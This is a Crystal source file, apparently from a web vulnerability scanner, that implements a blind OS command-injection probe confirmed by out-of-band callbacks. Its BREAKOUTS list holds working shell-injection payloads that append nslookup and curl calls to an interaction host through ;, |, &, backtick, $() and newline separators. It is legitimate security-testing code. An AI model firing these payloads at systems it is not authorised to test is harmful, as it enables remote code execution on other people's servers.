require "uri"
require "./types"
require "../out_of_band"
require "../../miner/inject"
require "./insertion_points"
require "../../fuzz/content_length"
require "../../proxy/codec/http1"

module Gori
  module Probe
    module Active
      # Active blind OS command-injection probe, OUT-OF-BAND. When a request parameter is
      # concatenated into a shell command the server runs — the classic network-diagnostic
      # surface (`/ping?host=…` shelling out to `ping`, an `nslookup`/`traceroute` wrapper, an
      # `?cmd=`/`?exec=` admin helper) — a value carrying a shell metacharacter breaks out of the
      # intended command and runs the attacker's. The result is remote code execution, the most
      # severe finding in the active set.
      #
      # Like blind SSRF (`SsrfOast`), the tell is not on the sending socket: a blind injection
      # produces no reflected output gori can read. So this rule cannot confirm itself in band —
      # it plants an OAST payload and leaves the proof to `Probe::OutOfBand.sweep`, which fires
      # when (and only when) the target's shell actually resolves or fetches the interaction
      # host. The injected commands are a name lookup of the minted host (`nslookup`) AND an
      # HTTP fetch of the minted URL (`curl`) — interactsh/BOAST put the token in DNS, while
      # webhook.site/postbin/custom-http put it in the path or query, so `nslookup` of a URL
      # payload would never carry a unique token. Either callback confirms execution.
      #
      # Gated to keep the automatic scan quiet and the finding meaningful, mirroring SsrfOast:
      #   * runs ONLY when the project has a registered OAST listener (`opts.oob`). No listener,
      #     no payload to mint, no plan — the check is simply absent for a project that never set
      #     one up, rather than a switch to toggle.
      #   * GET by default (a diagnostic parameter is overwhelmingly a query parameter);
      #     `allow_unsafe` widens the method gate so a POST that still carries the name on the
      #     query string is probed. Body slots are not read.
      #   * the parameter NAME must be one of the conventional command / diagnostic names
      #     (`cmd`, `ping`, `host`, `nslookup`, …). Command-injection values are arbitrary text
      #     (a hostname, a filename, a flag), so — unlike SSRF — there is no value SHAPE to gate
      #     on; the name is the whole signal, so the set is kept deliberately tight (every member
      #     spends a payload on every hit).
      #
      # Only the FIRST qualifying parameter is probed per flow: minting more payloads than the
      # one that matters would spend the operator's interaction budget on noise, and a callback
      # attributes to a single parameter anyway. Safe by construction — an `nslookup`/`curl`
      # payload landing in a parameter that never reaches a shell is treated as an ordinary
      # (odd) string and mutates nothing, so the query-only, safe-method default never changes
      # server state.
      class CmdInjectionOast < Rule
        # Query parameter names that conventionally flow into an OS command. Two families:
        # explicit command runners (`cmd`/`exec`/`shell`) and the network-diagnostic wrappers
        # (`ping`/`nslookup`/`traceroute`/`host`) that shell out to a tool with the parameter as
        # its argument. Kept tight for the same reason SsrfOast's list is: every name here sends
        # a probe, so a false member is a payload wasted on every hit.
        CMD_PARAMS = Set{"cmd", "command", "exec", "execute", "shell", "subprocess",
                         "ping", "host", "hostname", "ip", "addr", "address",
                         "domain", "dns", "lookup", "nslookup", "traceroute", "tracert", "mtr"}

        # Shell-breakout templates. `HOST` is the lookup name (URI host of a URL payload, else
        # the payload itself); `URL` is the fetchable form (`payload` if it already has `://`,
        # else `http://#{payload}`). Concatenated AFTER the parameter's original value so a
        # legitimate leading command (`ping <value>`) still parses and the shell then reaches
        # ours. Each fragment leads with a DIFFERENT metacharacter so that whichever one the
        # target's shell honours triggers the SAME callback — attributed by token regardless of
        # which separator fired, so packing several into one value is what makes this a
        # single-request check. `nslookup` covers DNS-capable providers (Linux/macOS/Windows);
        # `curl "URL"` is what uniquely confirms webhook.site/postbin/custom-http, whose nonce
        # lives in the path or query. Double-quoted so a custom-http `?oid=`/`&oid=` does not
        # background in the shell. The backtick / `$()` forms stay Unix-only nslookup; they land
        # as harmless literals on a Windows shell that ignores them.
        BREAKOUTS = [
          ";nslookup HOST;curl \"URL\";",    # sh/bash sequential
          "|nslookup HOST",                  # pipe
          "&nslookup HOST&curl \"URL\"&",    # background / Windows `cmd` chain
          "`nslookup HOST`",                 # backtick command substitution
          "$(nslookup HOST)",                # $() command substitution
          "\nnslookup HOST\ncurl \"URL\"\n", # newline (argument / script injection)
        ]

        def info : RuleInfo
          RuleInfo.new("cmd_injection_oast", "Blind OS command injection (out-of-band)",
            "Appends a shell-breakout OAST payload to a command/diagnostic parameter and flags the " \
            "finding when the server's shell calls back.",
            Category::ACTIVE)
        end

        # One probe: the breakout polyglot is packed into a single request. Static annotation for
        # the Rules sub-tab + manual-run estimate.
        def requests_per_flow : Range(Int32, Int32)
          1..1
        end

        def dedup_key(detail : Store::FlowDetail, opts : Options = Options::DEFAULT) : String?
          # No minter ⇒ plan returns nil ⇒ this must too (the dedup_key⇔plan equivalence). The
          # check is a nil test on an already-resolved field — it never mints, so the cheap
          # pre-plan key stays cheap.
          return nil unless opts.oob
          surface, slot = gate(detail, opts) || return nil
          key_string(detail, surface, slot)
        end

        def plan(detail : Store::FlowDetail, opts : Options = Options::DEFAULT) : Plan?
          minter = opts.oob || return nil
          surface, slot = gate(detail, opts) || return nil
          minted = minter.mint || return nil # listener went away between dedup_key and here
          payload, token, session_id = minted
          # REPLACE (not RAW): the value is the original value plus the breakout fragments, and
          # `build` percent-encodes the whole thing (`space_to_plus: false`) exactly as the old
          # `encode_value` did — see `inject_value`.
          change = InsertionPoints::Change.new(replace: inject_value(slot.value.scrub, payload))
          request = InsertionPoints.build(detail, [{slot, change}])
          candidate = OutOfBand::Candidate.new(
            token: token, payload: payload, session_id: session_id,
            code: "cmd_injection_oast",
            title: "Blind OS command injection (server executed an injected command)",
            severity: Store::Severity::Critical,
            evidence: "param `#{slot.name}` injected with an OS-command OAST payload"[0, 120])
          Plan.new(request, [Param.new("query", slot.name, token)],
            key_string(detail, surface, slot), oob: [candidate])
        end

        # Blind by construction: nothing on the sending socket confirms it. The empty return is
        # not a stub — it is the whole point. Promotion happens in `OutOfBand.sweep` when the
        # payload's callback arrives, possibly minutes later and in another process.
        def detections(plan : Plan, result : Repeater::Result, detail : Store::FlowDetail) : Array(Detection)
          [] of Detection
        end

        # The injected value: the parameter's ORIGINAL (decoded) value, then every breakout
        # fragment with `HOST`/`URL` filled in. Keeping the original as a prefix lets the
        # legitimate leading command parse before the separators hand control to nslookup/curl.
        private def inject_value(orig : String, payload : String) : String
          url, host = payload_parts(payload)
          orig + BREAKOUTS.join(&.gsub("HOST", host).gsub("URL", url))
        end

        # Fetchable URL and lookup host, mirroring SsrfOast#inject_url's provider split.
        # A URL-minting provider (webhook.site / postbin / custom-http) is used verbatim as
        # the fetch target and only its URI host is handed to nslookup — nslookup of the
        # full URL cannot put a path/query nonce in the DNS haystack the sweep matches on.
        private def payload_parts(payload : String) : {String, String}
          if payload.includes?("://")
            host = (URI.parse(payload).host rescue nil)
            host = payload if host.nil? || host.empty?
            {payload, host}
          else
            {"http://#{payload}", payload}
          end
        end

        # Shared gate for plan + dedup_key: the enumerated QUERY surface and the FIRST query slot
        # whose name is a conventional command/diagnostic parameter with a non-empty value. Both
        # paths funnel here so they cannot drift (the equivalence-spec invariant). Only the query
        # string is probed — body slots are not read.
        private def gate(detail : Store::FlowDetail, opts : Options) : {InsertionPoints::Surface, InsertionPoints::Slot}?
          method, _, malformed = Proxy::Codec::Http1.parse_request_line(detail.request_head)
          return nil if malformed || !method_allowed?(method.upcase, opts)
          surface = InsertionPoints.enumerate(detail, opts, [Miner::Location::Query]) || return nil
          slot = surface.slots.find do |s|
            !s.raw_value.empty? && CMD_PARAMS.includes?(s.name.scrub.downcase)
          end
          slot ? {surface, slot} : nil
        end

        private def key_string(detail : Store::FlowDetail, surface : InsertionPoints::Surface,
                               slot : InsertionPoints::Slot) : String
          InsertionPoints.dedup_key("cmd_injection_oast", detail, surface.method, surface.path, [slot])
        end
      end
    end
  end
end
